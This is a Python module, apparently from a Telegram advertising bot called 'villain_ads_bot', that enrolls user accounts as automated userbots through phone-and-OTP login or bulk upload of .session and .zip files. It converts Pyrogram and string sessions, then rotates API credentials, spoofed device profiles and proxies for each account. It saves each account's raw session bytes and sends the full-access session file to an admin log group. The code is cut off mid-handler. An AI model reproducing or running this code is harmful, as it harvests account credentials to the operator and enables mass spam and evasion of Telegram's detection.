import os
import logging
import asyncio
import zipfile
import tempfile
import time
import uuid
import sqlite3
from telethon import events, TelegramClient
from telethon.tl import types, functions
from telethon.sessions import StringSession, SQLiteSession
from telethon.sessions.sqlite import CURRENT_VERSION
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberBannedError,
    PhoneNumberInvalidError,
    ApiIdInvalidError,
    ApiIdPublishedFloodError,
    SendCodeUnavailableError
)
from villain_ads_bot.data import database
from villain_ads_bot.data import models
from villain_ads_bot import config
from villain_ads_bot.core import utils
from villain_ads_bot.core import proxy as proxy_tool
from villain_ads_bot.services import userbot_manager
from villain_ads_bot.services.userbot import force_join_channels, apply_branding

logger = logging.getLogger(__name__)

# Standard Telegram DC IP and port mappings
DC_MAP = {
    1: ("149.154.175.53", 443),
    2: ("149.154.167.51", 443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.92", 443),
    5: ("91.108.56.130", 443),
}

def normalize_or_convert_session(file_path: str) -> bool:
    """
    Validates and automatically converts Pyrogram SQLite sessions or StringSessions
    into native Telethon SQLite sessions on the fly.
    """
    if not os.path.exists(file_path):
        return False
        
    with open(file_path, "rb") as f:
        header = f.read(16)
        
    if header.startswith(b"SQLite format 3\x00"):
        try:
            conn = sqlite3.connect(file_path)
            cur = conn.cursor()
            cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
            if not cur.fetchone():
                conn.close()
                return False
            cur.execute("PRAGMA table_info(sessions)")
            cols = [r[1] for r in cur.fetchall()]
            
            # Detect Pyrogram session (has auth_key and dc_id but missing server_address)
            if "dc_id" in cols and "auth_key" in cols and "server_address" not in cols:
                cur.execute("SELECT dc_id, auth_key FROM sessions LIMIT 1")
                row = cur.fetchone()
                conn.close()
                if not row or not row[1]:
                    return False
                dc_id = row[0] or 2
                auth_key = row[1]
                
                os.remove(file_path)
                new_conn = sqlite3.connect(file_path)
                new_conn.execute("CREATE TABLE version (version integer primary key)")
                new_conn.execute(f"INSERT INTO version VALUES ({CURRENT_VERSION})")
                new_conn.execute("""
                    CREATE TABLE sessions (
                        dc_id integer primary key,
                        server_address text,
                        port integer,
                        auth_key blob,
                        takeout_id integer,
                        tmp_auth_key blob
                    )
                """)
                srv_addr, port = DC_MAP.get(dc_id, ("149.154.167.51", 443))
                new_conn.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, NULL, NULL)", (dc_id, srv_addr, port, auth_key))
                new_conn.execute("""
                    CREATE TABLE entities (
                        id integer primary key,
                        hash integer not null,
                        username text,
                        phone integer,
                        name text,
                        date integer
                    )
                """)
                new_conn.execute("""
                    CREATE TABLE sent_files (
                        md5_digest blob,
                        file_size integer,
                        type integer,
                        id integer,
                        hash integer,
                        primary key(md5_digest, file_size, type)
                    )
                """)
                new_conn.execute("""
                    CREATE TABLE update_state (
                        id integer primary key,
                        pts integer,
                        qts integer,
                        date integer,
                        seq integer
                    )
                """)
                new_conn.commit()
                new_conn.close()
                logger.info(f"Successfully converted Pyrogram session {os.path.basename(file_path)} to Telethon SQLite format.")
                return True
            conn.close()
            return True
        except Exception as e:
            logger.warning(f"Error checking SQLite session schema for {file_path}: {e}")
            return False
            
    # Check if text file contains a StringSession
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read().strip()
        if text and len(text) > 40 and not text.startswith("{"):
            ss = StringSession(text)
            if ss.auth_key:
                os.remove(file_path)
                new_conn = sqlite3.connect(file_path)
                new_conn.execute("CREATE TABLE version (version integer primary key)")
                new_conn.execute(f"INSERT INTO version VALUES ({CURRENT_VERSION})")
                new_conn.execute("""
                    CREATE TABLE sessions (
                        dc_id integer primary key,
                        server_address text,
                        port integer,
                        auth_key blob,
                        takeout_id integer,
                        tmp_auth_key blob
                    )
                """)
                srv_addr = ss.server_address or DC_MAP.get(ss.dc_id, ("149.154.167.51", 443))[0]
                port = ss.port or 443
                new_conn.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, NULL, NULL)", (ss.dc_id, srv_addr, port, ss.auth_key.key))
                new_conn.execute("CREATE TABLE entities (id integer primary key, hash integer not null, username text, phone integer, name text, date integer)")
                new_conn.execute("CREATE TABLE sent_files (md5_digest blob, file_size integer, type integer, id integer, hash integer, primary key(md5_digest, file_size, type))")
                new_conn.execute("CREATE TABLE update_state (id integer primary key, pts integer, qts integer, date integer, seq integer)")
                new_conn.commit()
                new_conn.close()
                logger.info(f"Successfully converted StringSession {os.path.basename(file_path)} to Telethon SQLite format.")
                return True
    except Exception as e:
        logger.debug(f"String session check error: {e}")
        
    return False

# In-memory dictionary containing ongoing login flows
# Structure: { user_id: { "step": str, "phone": str, "client": TelegramClient, "phone_code_hash": str } }
_login_states = {}

async def clean_login_state(user_id: int):
    """
    Cleans up the login state for a user and disconnects any temporary client.
    """
    if user_id in _login_states:
        state = _login_states.pop(user_id)
        temp_client = state.get("client")
        if temp_client:
            try:
                if temp_client.is_connected():
                    await temp_client.disconnect()
            except Exception as e:
                logger.warning(f"Error disconnecting temporary login client: {e}")

def format_otp_sent_message(phone: str, sent_code, lang: str = "en") -> str:
    """Formats a crystal-clear, transparent message telling the user exactly where the OTP went."""
    code_type = getattr(sent_code, "type", None)
    
    if isinstance(code_type, types.auth.SentCodeTypeApp):
        if lang == "hi":
            return (
                f"<blockquote><b>» 📩 सत्यापन कोड (OTP) भेजा गया!</b>\n\n"
                f"📱 <b>गंतव्य :</b> <b>Official Telegram App (In-App Chat)</b>\n"
                f"💬 कोड <code>{phone}</code> के <b>Telegram App</b> के अंदर नीले टिक वाली <b>'Telegram'</b> आधिकारिक चैट में भेजा गया है।\n\n"
                f"⚠️ <b>जरूरी :</b> यह SIM पर साधारण SMS के रूप में <b>नहीं</b> आएगा! अपना Telegram App खोलें और 'Telegram' चैट से 5-अंकों का कोड देखें।\n\n"
                f"✍️ <b>5-अंकों का कोड यहाँ भेजें (उदा. <code>1 2 3 4 5</code>) :</b></blockquote>"
            )
        else:
            return (
                f"<blockquote><b>» 📩 Verification Code (OTP) Sent!</b>\n\n"
                f"📱 <b>Destination :</b> <b>Official Telegram App (In-App Chat)</b>\n"
                f"💬 The code was sent to the official <b>'Telegram'</b> service chat (with blue verification badge) on your active Telegram app for <code>{phone}</code>.\n\n"
                f"⚠️ <b>Important :</b> Telegram delivers this code <b>inside the Telegram App</b>, NOT via phone SMS! Please open your Telegram app to see the code.\n\n"
                f"✍️ <b>Enter The 5-Digit Code Below (e.g. <code>1 2 3 4 5</code>) :</b></blockquote>"
            )
    elif isinstance(code_type, types.auth.SentCodeTypeSms):
        if lang == "hi":
            return (
                f"<blockquote><b>» 📩 SMS कोड भेजा गया!</b>\n\n"
                f"📱 5-अंकों का सत्यापन कोड <code>{phone}</code> पर SMS द्वारा भेजा गया है।\n\n"
                f"✍️ <b>5-अंकों का कोड यहाँ भेजें (उदा. <code>1 2 3 4 5</code>) :</b></blockquote>"
            )
        else:
            return (
                f"<blockquote><b>» 📩 SMS Code Sent!</b>\n\n"
                f"📱 A 5-digit verification code has been sent via SMS to <code>{phone}</code>.\n\n"
                f"✍️ <b>Enter The 5-Digit Code Below (e.g. <code>1 2 3 4 5</code>) :</b></blockquote>"
            )
    elif isinstance(code_type, (types.auth.SentCodeTypeCall, types.auth.SentCodeTypeFlashCall, types.auth.SentCodeTypeMissedCall)):
        return (
            f"<blockquote><b>» 📞 Verification Phone Call!</b>\n\n"
            f"Telegram is calling <code>{phone}</code> to dictate your login code.\n\n"
            f"✍️ <b>Enter The 5-Digit Code Below (e.g. <code>1 2 3 4 5</code>) :</b></blockquote>"
        )
    elif isinstance(code_type, types.auth.SentCodeTypeEmailCode):
        pattern = getattr(code_type, "email_pattern", "your email")
        return (
            f"<blockquote><b>» 📧 Email Verification Code!</b>\n\n"
            f"Telegram sent the verification code to your linked email (<code>{pattern}</code>).\n\n"
            f"✍️ <b>Enter The Code Below :</b></blockquote>"
        )
    else:
        return (
            f"<blockquote><b>» 📩 Verification Code Sent!</b>\n\n"
            f"A verification code has been sent for <code>{phone}</code>.\n"
            f"⚠️ <i>Please check both your <b>Telegram App</b> (Official 'Telegram' notification chat) and SMS.</i>\n\n"
            f"✍️ <b>Enter The 5-Digit Code Below (e.g. <code>1 2 3 4 5</code>) :</b></blockquote>"
        )


def register_handlers(client):
    
    @client.on(events.CallbackQuery(pattern="^cancel_login$"))
    async def cancel_login_callback(event):
        user_id = event.sender_id
        await clean_login_state(user_id)
        from .my_bots import show_bots_list
        await show_bots_list(event, user_id, flash_message="<blockquote><b>» ❌ Login Flow Cancelled.</b></blockquote>")

    @client.on(events.CallbackQuery(pattern="^resend_otp_action$"))
    async def resend_otp_callback(event):
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        
        state = _login_states.get(user_id)
        if not state or not state.get("client") or not state.get("phone"):
            await event.answer("⚠️ Session expired. Please start login again.", alert=True)
            from .my_bots import show_bots_list
            await show_bots_list(event, user_id)
            return
            
        temp_client = state["client"]
        phone = state["phone"]
        
        # 1. Cooldown check: prevent premature calls that guarantee SendCodeUnavailableError
        sent_at = state.get("code_sent_at", 0)
        timeout = state.get("timeout", 60) or 60
        elapsed = time.time() - sent_at
        remaining = int(timeout - elapsed)
        if remaining > 0 and elapsed > 0:
            wait_alert = (
                f"⏳ कृपया {remaining} सेकंड प्रतीक्षा करें।"
                if lang == "hi"
                else f"⏳ Please wait {remaining}s before requesting a new code."
            )
            await event.answer(wait_alert, alert=True)
            return

        # 2. Resend code safely without breaking the user's prompt screen
        try:
            if not temp_client.is_connected():
                await temp_client.connect()
                
            sent_code = None
            try:
                # First try standard resend (switches to SMS / next type if Telegram supports it)
                sent_code = await temp_client.send_code_request(phone)
            except (SendCodeUnavailableError, PhoneCodeExpiredError):
                # Telegram disallows SMS resend or the hash expired.
                # Request a FRESH in-app code by clearing Telethon's internal cached phone hash!
                if hasattr(temp_client, "_phone_code_hash"):
                    temp_client._phone_code_hash.pop(phone, None)
                sent_code = await temp_client.send_code_request(phone)

            state["phone_code_hash"] = sent_code.phone_code_hash
            state["code_sent_at"] = time.time()
            state["timeout"] = getattr(sent_code, "timeout", 60) or 60
            state["step"] = "WAITING_FOR_OTP"
            
            code_type = getattr(sent_code, "type", None)
            if isinstance(code_type, types.auth.SentCodeTypeApp):
                dest = "Telegram App ('Telegram' चैट)" if lang == "hi" else "Telegram App ('Telegram' chat)"
            elif isinstance(code_type, types.auth.SentCodeTypeSms):
                dest = "SMS"
            else:
                dest = "Telegram"
                
            ans_text = (
                f"📩 नया कोड भेजा गया! कृपया अपना {dest} चेक करें।"
                if lang == "hi"
                else f"📩 New code sent! Please check your {dest}."
            )
            await event.answer(ans_text, alert=True)
            
            # Update prompt text with delivery info without changing buttons
            prompt_text = format_otp_sent_message(phone, sent_code, lang)
            buttons = [
                [
                    utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                    utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                ]
            ]
            try:
                await event.edit(prompt_text, buttons=buttons, parse_mode="html")
            except Exception:
                pass
                
        except FloodWaitError as fwe:
            wait_msg = (
                f"⚠️ Telegram Flood Wait: कृपया {fwe.seconds}s प्रतीक्षा करें।"
                if lang == "hi"
                else f"⚠️ Telegram Flood Wait: Please wait {fwe.seconds}s before resending."
            )
            await event.answer(wait_msg, alert=True)
        except Exception as e:
            logger.error(f"Failed to resend code to {phone}: {e}")
            utils.report_error(f"add_bot.resend_otp:{phone}", e)
            err_msg = (
                "⚠️ कोड दोबारा नहीं भेजा जा सका। कृपया अपना Telegram App चेक करें या कुछ देर बाद प्रयास करें।"
                if lang == "hi"
                else "⚠️ Could not resend code right now. Please check your Telegram app for the active code."
            )
            await event.answer(err_msg, alert=True)

    @client.on(events.NewMessage(pattern=r"(?i)^/login(?:@\w+)?$"))
    async def login_cmd(event):
        if not event.is_private:
            me = await client.get_me()
            bot_username = getattr(me, "username", None) or "Bot"
            await event.reply(
                "<blockquote><b>» ➕ Add / Login Userbot</b>\n\nTap below to open the login portal in private message:</blockquote>",
                buttons=[[Button.url("🚀 Open Login Portal", f"https://t.me/{bot_username}?start=login")]],
                parse_mode="html"
            )
            return
        await add_bot_start(event)

    @client.on(events.CallbackQuery(pattern="^menu_add_bot$"))
    async def add_bot_start(event):
        if hasattr(event, "answer"):
            try: await event.answer()
            except Exception: pass
        user_id = event.sender_id
        user = database.get_user(user_id)
        if not user:
            user = models.create_default_user(user_id)
            database.save_user(user)

        lang = user.get("language", "en")
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        remaining = allowed - len(sessions)
        if remaining <= 0:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return

        await clean_login_state(user_id)

        choice_text = (
            f"<blockquote><b>» ➕ Add Userbot Account</b>\n\n"
            f"📦 <b>Remaining Slots :</b> <b>{remaining}</b>\n\n"
            f"Choose A Login Method :\n"
            f"• 📱 <b>Phone Login</b> — enter number + OTP\n"
            f"• 📁 <b>Upload .session / .zip</b> — import session file(s)</blockquote>"
        )
        buttons = [
            [utils.styled_button("📱 Phone + Otp Login", "menu_add_bot_phone", style="success")],
            [utils.styled_button("📁 Upload .Session / .Zip", "menu_add_bot_session", style="primary")],
            [utils.styled_button("❌ Cancel", "cancel_login", style="danger")],
        ]
        try:
            await event.edit(choice_text, buttons=buttons, parse_mode="html")
        except Exception:
            await event.respond(choice_text, buttons=buttons, parse_mode="html")

    @client.on(events.CallbackQuery(pattern="^menu_add_bot_phone$"))
    async def add_bot_phone_start(event):
        await event.answer()
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        if len(sessions) >= allowed:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return
        await clean_login_state(user_id)
        _login_states[user_id] = {"step": "WAITING_FOR_PHONE"}
        buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
        try:
            await event.edit(utils.get_text("login_phone_prompt", lang), buttons=buttons)
        except Exception:
            await event.respond(utils.get_text("login_phone_prompt", lang), buttons=buttons)

    @client.on(events.CallbackQuery(pattern="^menu_add_bot_session$"))
    async def add_bot_session_start(event):
        await event.answer()
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        remaining = allowed - len(sessions)
        if remaining <= 0:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return
        await clean_login_state(user_id)
        _login_states[user_id] = {"step": "WAITING_FOR_SESSION_FILE", "remaining_slots": remaining}
        prompt = (
            f"<blockquote><b>» 📁 Upload .session / .zip</b>\n\n"
            f"• <b>Single .session</b> — send one <code>.session</code> file\n"
            f"• <b>Multiple .zip</b> — send a <code>.zip</code> containing multiple <code>.session</code> files\n\n"
            f"📦 <b>Available Slots :</b> <b>{remaining}</b>\n\n"
            f"➡️ Send your file(s) below:</blockquote>"
        )
        buttons = [[utils.styled_button("❌ Cancel", "cancel_login", style="danger")]]
        try:
            await event.edit(prompt, buttons=buttons, parse_mode="html")
        except Exception:
            await event.respond(prompt, buttons=buttons, parse_mode="html")

    @client.on(events.NewMessage)
    async def login_input_handler(event):
        if not event.is_private:
            return
            
        user_id = event.sender_id
        
        # Proactively detect .session or .zip uploads even if button wasn't clicked first
        doc = getattr(event, "document", None)
        if not doc and hasattr(event, "media") and event.media:
            doc = getattr(event.media, "document", None)
            
        if doc and user_id not in _login_states:
            fname = ""
            for attr in getattr(doc, "attributes", []):
                if hasattr(attr, "file_name") and attr.file_name:
                    fname = attr.file_name
                    break
            fname_lower = (fname or "").lower()
            mime = (getattr(doc, "mime_type", "") or "").lower()
            if fname_lower.endswith(".session") or fname_lower.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed"):
                allowed = utils.get_allowed_slots(user_id)
                sessions = database.get_sessions(user_id)
                remaining = allowed - len(sessions)
                if remaining <= 0:
                    user = database.get_user(user_id)
                    lang = user.get("language", "en") if user else "en"
                    await event.reply(utils.get_text("error_no_slots", lang, allowed=allowed), parse_mode="html")
                    return
                _login_states[user_id] = {"step": "WAITING_FOR_SESSION_FILE", "remaining_slots": remaining}

        if user_id not in _login_states:
            return
            
        # Allow aborting the login flow via /start or cancel
        raw_txt = (event.text or "").strip().lower()
        if raw_txt in ("/start", "/cancel", "cancel", "back", "/abort", "abort"):
            await clean_login_state(user_id)
            if not raw_txt.startswith("/start"):
                from .my_bots import show_bots_list
                await show_bots_list(event, user_id, flash_message="<blockquote><b>» ❌ Login Cancelled.</b></blockquote>")
            return
            
        state = _login_states[user_id]
        step = state["step"]
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"

        # ------------------ SESSION FILE UPLOAD ------------------
        if step == "WAITING_FOR_SESSION_FILE":
            if not doc:
                await event.reply("<blockquote><b>» ⚠️ No File Detected</b>\n\nPlease send a <code>.session</code> file or a <code>.zip</code> containing session files.</blockquote>", parse_mode="html")
                return
            fname = ""
            try:
                for attr in getattr(doc, "attributes", []):
                    if hasattr(attr, "file_name") and attr.file_name:
                        fname = attr.file_name
                        break
            except Exception:
                pass
            fname_lower = (fname or "").lower()
            mime = (getattr(doc, "mime_type", "") or "").lower()
            is_zip = fname_lower.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed", "application/x-zip")
            is_sess = fname_lower.endswith(".session") or fname_lower.endswith(".txt")
            if not is_zip and not is_sess:
                await event.reply("<blockquote><b>» ❌ Invalid File</b>\n\nOnly <code>.session</code> or <code>.zip</code> archives containing session files are accepted.</blockquote>", parse_mode="html")
                return

            prog = await event.reply("<blockquote><b>» ⏳ Processing...</b>\n\nDownloading & inspecting session file(s)...</blockquote>", parse_mode="html")
            allowed = utils.get_allowed_slots(user_id)
            existing = database.get_sessions(user_id)
            remaining = state.get("remaining_slots", allowed - len(existing))
            if remaining <= 0:
                await prog.edit("<blockquote><b>» ❌ No Slots Available</b>\n\nYou have reached your maximum userbot slot limit.</blockquote>", parse_mode="html")
                await clean_login_state(user_id)
                return

            os.makedirs(config.DOWNLOADS_DIR, exist_ok=True)
            safe_fname = fname or ("archive.zip" if is_zip else "uploaded.session")
            temp_dl = os.path.join(config.DOWNLOADS_DIR, f"sess_dl_{user_id}_{int(time.time())}_{safe_fname}")
            try:
                await client.download_media(event.media, file=temp_dl)
            except Exception as dl_err:
                utils.report_error("add_bot.session_download", dl_err)
                await prog.edit("<blockquote><b>» ❌ Download Failed</b>\n\n⚠️ <i>The session file could not be downloaded. Please try again.</i></blockquote>", parse_mode="html")
                await clean_login_state(user_id)
                return

            session_files = []
            extract_dir = None
            if is_sess and not is_zip:
                session_files = [(temp_dl, safe_fname)]
            elif is_zip:
                try:
                    extract_dir = os.path.join(config.DOWNLOADS_DIR, f"sess_zip_{user_id}_{int(time.time())}")
                    os.makedirs(extract_dir, exist_ok=True)
                    with zipfile.ZipFile(temp_dl, "r") as zf:
                        for idx, member in enumerate(zf.namelist()):
                            if member.startswith("__MACOSX") or "/." in member or member.endswith("/"):
                                continue
                            base = os.path.basename(member)
                            if not base or base.startswith("."):
                                continue
                            base_lower = base.lower()
                            if base_lower.endswith(".session") or base_lower.endswith(".txt"):
                                target_p = os.path.join(extract_dir, f"sess_{idx}_{base}")
                                with zf.open(member) as src, open(target_p, "wb") as dst:
                                    dst.write(src.read())
                                session_files.append((target_p, base))
                except Exception as zip_err:
                    utils.report_error("add_bot.zip_extraction", zip_err)
                    await prog.edit(f"<blockquote><b>» ❌ Zip Extraction Failed</b>\n\n⚠️ <i>Could not extract zip archive: {zip_err}</i></blockquote>", parse_mode="html")
                    await clean_login_state(user_id)
                    try:
                        if os.path.exists(temp_dl):
                            os.remove(temp_dl)
                    except Exception:
                        pass
                    return

            if not session_files:
                await prog.edit("<blockquote><b>» ❌ No .session Files Found</b>\n\nThe zip archive did not contain any valid <code>.session</code> files.</blockquote>", parse_mode="html")
                await clean_login_state(user_id)
                try:
                    if os.path.exists(temp_dl):
                        os.remove(temp_dl)
                except Exception:
                    pass
                return

            session_files = session_files[:remaining]
            successes, failures = [], []
            import shutil

            dest_dir = utils.ensure_user_dir(user_id)
            os.makedirs(dest_dir, exist_ok=True)

            for idx, (sf_path, sf_name) in enumerate(session_files):
                try:
                    await prog.edit(f"<blockquote><b>» ⏳ Processing ({idx+1}/{len(session_files)})</b>\n\nValidating <code>{sf_name}</code> on Telegram...</blockquote>", parse_mode="html")
                except Exception:
                    pass

                # Convert Pyrogram or StringSession if needed
                try:
                    normalize_or_convert_session(sf_path)
                except Exception as norm_err:
                    logger.debug(f"Normalization check error for {sf_name}: {norm_err}")

                temp_test_id = f"test_{user_id}_{int(time.time())}_{uuid.uuid4().hex[:6]}"
                temp_test_path = os.path.join(dest_dir, f"{temp_test_id}.session")
                try:
                    shutil.copy2(sf_path, temp_test_path)
                    api_id, api_hash = config.get_random_api_id_hash()
                    if not api_id or not api_hash:
                        api_id, api_hash = config.API_ID, config.API_HASH
                    dev_prof = utils.get_device_profile(temp_test_id)
                    login_proxy = proxy_tool.resolve_session_proxy(temp_test_id)
                    login_kwargs = {}
                    if login_proxy:
                        tp = proxy_tool.build_telethon_proxy(login_proxy)
                        if tp:
                            login_kwargs["proxy"] = tp
                            login_kwargs["connection"] = proxy_tool.get_connection_class(login_proxy)

                    test_client = TelegramClient(
                        temp_test_path[:-8] if temp_test_path.endswith(".session") else temp_test_path,
                        api_id,
                        api_hash,
                        device_model=dev_prof["device_model"],
                        system_version=dev_prof["system_version"],
                        app_version=dev_prof["app_version"],
                        lang_code=dev_prof.get("lang_code", "en"),
                        **login_kwargs
                    )
                    await asyncio.wait_for(test_client.connect(), timeout=18.0)
                    is_auth = await asyncio.wait_for(test_client.is_user_authorized(), timeout=12.0)
                    if not is_auth:
                        raise Exception("Session is not authorized / revoked on Telegram")

                    me = await test_client.get_me()
                    if not me:
                        raise Exception("Failed to fetch Telegram account profile")

                    name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "UserBot"
                    username = me.username or ""
                    phone_actual = f"+{me.phone}" if me.phone else None
                    if not phone_actual or len(phone_actual) < 7:
                        digits = "".join(c for c in os.path.splitext(sf_name)[0] if c.isdigit())
                        phone_actual = f"+{digits}" if len(digits) >= 7 else f"+user_{me.id}"

                    # Explicitly disconnect and close SQLite handle before moving
                    await test_client.disconnect()
                    if hasattr(test_client.session, "close"):
                        try:
                            test_client.session.close()
                        except Exception:
                            pass
                    del test_client
                    import gc
                    gc.collect()

                    actual_dest = os.path.join(dest_dir, f"{phone_actual}.session")
                    if os.path.exists(actual_dest):
                        if userbot_manager.is_bot_running(phone_actual):
                            try:
                                await userbot_manager.stop_bot(phone_actual)
                            except Exception:
                                pass
                        try:
                            os.remove(actual_dest)
                        except Exception:
                            pass

                    shutil.move(temp_test_path, actual_dest)
                    dest_path = actual_dest

                    with open(dest_path, "rb") as f:
                        sess_bytes = f.read()

                    sess_record = models.create_default_session(phone_actual, user_id, phone_actual, dest_path)
                    sess_record["name"] = name
                    sess_record["username"] = username
                    sess_record["two_step_password"] = "None"
                    sess_record["session_bytes"] = sess_bytes
                    sess_record["api_id"] = api_id
                    sess_record["api_hash"] = api_hash
                    database.save_session(sess_record)

                    started = await userbot_manager.start_userbot(phone_actual)
                    label = f"{'@'+username if username else name} (<code>{phone_actual}</code>)"
                    successes.append(f"{label} {'✅' if started else '⚠️'}")

                    # Send audit log to admin group
                    try:
                        gs = database.get_global_settings()
                        lgid = gs.get("log_group_id")
                        if lgid:
                            from telethon import Button
                            log_buttons = [
                                [Button.inline("🎮 Control Userbot", data=f"admin_ctrl_bot_{phone_actual}".encode())]
                            ]
                            if username:
                                log_buttons.append([Button.url(f"👤 Open Account (@{username})", f"https://t.me/{username}")])
                            else:
                                log_buttons.append([Button.url(f"👤 Open Account ({name})", f"tg://openmessage?user_id={me.id}")])
                            log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])

                            lt = (
                                f"<blockquote><b>» ➕ New Userbot Imported (Zip/Session)</b>\n\n"
                                f"👤 <b>Name :</b> {name}\n"
                                f"📞 <b>Phone :</b> <code>{phone_actual}</code>\n"
                                f"🆔 <b>Account ID :</b> <code>{me.id}</code>\n"
                                f"👑 <b>Owner ID :</b> <code>{user_id}</code>\n"
                                f"🏷 <b>Status :</b> {'Running ✅' if started else 'Saved ⚠️'}</blockquote>"
                            )
                            await utils.safe_send_to_log_group(
                                client,
                                lt,
                                file=dest_path,
                                buttons=log_buttons if log_buttons else None,
                                parse_mode="html"
                            )
                    except Exception as le:
                        logger.warning(f"Error sending log for session upload: {le}")

                except Exception as sess_err:
                    clean_err = str(sess_err)
                    if "AuthKeyDuplicated" in clean_err:
                        clean_err = "AuthKey duplicated across IPs"
                    elif "unauthorized" in clean_err.lower() or "revoked" in clean_err.lower():
                        clean_err = "Session revoked/expired"
                    elif "timeout" in clean_err.lower():
                        clean_err = "Connection timed out"
                    failures.append(f"{sf_name}: ❌ {clean_err}")
                    try:
                        if os.path.exists(temp_test_path):
                            os.remove(temp_test_path)
                    except Exception:
                        pass

            try:
                if os.path.exists(temp_dl):
                    os.remove(temp_dl)
            except Exception:
                pass
            try:
                if extract_dir and os.path.isdir(extract_dir):
                    shutil.rmtree(extract_dir, ignore_errors=True)
            except Exception:
                pass

            summary = "<blockquote><b>» 📁 Session Import Result</b>\n\n"
            if successes:
                summary += "<b>✅ Successfully Imported :</b>\n" + "\n".join(f"• {s}" for s in successes) + "\n\n"
            if failures:
                summary += "<b>❌ Failed :</b>\n" + "\n".join(f"• {f}" for f in failures) + "\n\n"
            summary += f"📦 <b>Total :</b> <b>{len(successes)}</b>/{len(session_files)} Accounts Imported.</blockquote>"
            try:
                await prog.edit(summary, parse_mode="html")
            except Exception:
                await event.reply(summary, parse_mode="html")

            await clean_login_state(user_id)
            if successes:
                from .my_bots import show_bots_list
                await asyncio.sleep(2)
                await show_bots_list(event, user_id, flash_message=f"<blockquote><b>» ✅ {len(successes)} Userbot(s) Imported!</b></blockquote>")
            return

        # ------------------ STEP 1: Phone input ------------------

        if step == "WAITING_FOR_PHONE":
            phone = event.text.strip().replace(" ", "")
            if not phone.startswith("+") or not phone[1:].isdigit():
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                await event.reply(utils.get_text("login_invalid_phone", lang), buttons=buttons)
                return
                
            # Create session folder & path
            user_dir = utils.ensure_user_dir(user_id)
            session_path = os.path.join(user_dir, f"{phone}.session")
            
            # Stop any existing running userbot for this phone to avoid locks
            if userbot_manager.is_bot_running(phone):
                try:
                    await userbot_manager.stop_bot(phone)
                except Exception as stop_err:
                    logger.warning(f"Error stopping userbot {phone} prior to re-login: {stop_err}")
            
            # Initialize temporary client using in-memory StringSession to prevent ANY SQLite file locks
            api_id, api_hash = config.get_random_api_id_hash()
            dev_prof = utils.get_device_profile(phone)
            # The login runs through a FRESH proxy (see above).
            login_proxy = proxy_tool.resolve_session_proxy(phone)
            login_kwargs = {}
            if login_proxy:
                tp = proxy_tool.build_telethon_proxy(login_proxy)
                if tp:
                    login_kwargs["proxy"] = tp
                    login_kwargs["connection"] = proxy_tool.get_connection_class(login_proxy)
            temp_client = TelegramClient(
                StringSession(), 
                api_id, 
                api_hash,
                device_model=dev_prof["device_model"],
                system_version=dev_prof["system_version"],
                app_version=dev_prof["app_version"],
                lang_code=dev_prof.get("lang_code", "en"),
                **login_kwargs
            )
            state["phone"] = phone
            state["client"] = temp_client
            state["session_path"] = session_path
            
            try:
                await temp_client.connect()
                sent_code = await temp_client.send_code_request(phone)
                state["phone_code_hash"] = sent_code.phone_code_hash
                state["code_sent_at"] = time.time()
                state["timeout"] = getattr(sent_code, "timeout", 60) or 60
                state["step"] = "WAITING_FOR_OTP"
                
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                prompt_msg = format_otp_sent_message(phone, sent_code, lang)
                await event.reply(prompt_msg, buttons=buttons, parse_mode="html")
            except FloodWaitError as fwe:
                buttons = [
                    [
                        utils.styled_button("🔄 Try Again", "menu_add_bot", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                fl_msg = (
                    f"<blockquote><b>» ⏳ Telegram Cooldown (Flood Wait)</b>\n\n"
                    f"Telegram ने इस नंबर पर अस्थायी रोक लगाई है।\n"
                    f"⏱ कृपया <b>{fwe.seconds} सेकंड</b> ({round(fwe.seconds / 60, 1)} मिनट) प्रतीक्षा करें।</blockquote>"
                    if lang == "hi"
                    else
                    f"<blockquote><b>» ⏳ Telegram Cooldown (Flood Wait)</b>\n\n"
                    f"Telegram has temporarily rate-limited login requests for this phone number.\n"
                    f"⏱ Please wait <b>{fwe.seconds} seconds</b> ({round(fwe.seconds / 60, 1)} minutes) before trying again.</blockquote>"
                )
                await event.reply(fl_msg, buttons=buttons, parse_mode="html")
                await clean_login_state(user_id)
            except PhoneNumberBannedError:
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                banned_msg = (
                    f"<blockquote><b>» 🚫 Telegram Account Banned</b>\n\n"
